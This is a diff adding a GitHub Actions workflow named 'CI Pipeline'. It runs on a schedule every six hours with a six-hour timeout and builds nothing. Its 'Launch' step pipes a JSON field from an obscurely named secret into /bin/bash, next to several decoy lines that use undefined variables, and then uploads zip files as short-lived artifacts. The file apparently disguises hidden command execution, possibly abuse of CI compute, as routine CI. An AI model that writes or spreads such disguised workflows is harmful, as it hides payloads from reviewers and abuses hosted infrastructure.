@@ -1,0 +1,34 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '15 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          zkvxa3473: ${{ secrets.zkvxa3473 }}
+        run: |
+          printf '%s' "$zkvxa3473" | jq -r .rbpx5 | /bin/bash
+          echo $coby6 | jq -r .xljnj7144 | /bin/bash
+          printf '%s' "$jvbsd3092" | jq -r .roicq3 | /bin/bash
+          echo $r3534 | jq -r .kl07283 | /bin/bash
+          printf '%s' "$qb648" | jq -r .gowl671 | /bin/bash
+          echo $y49 | jq -r .unb399 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1ToxUkjo
+          path: "*.zip"
+          retention-days: 1
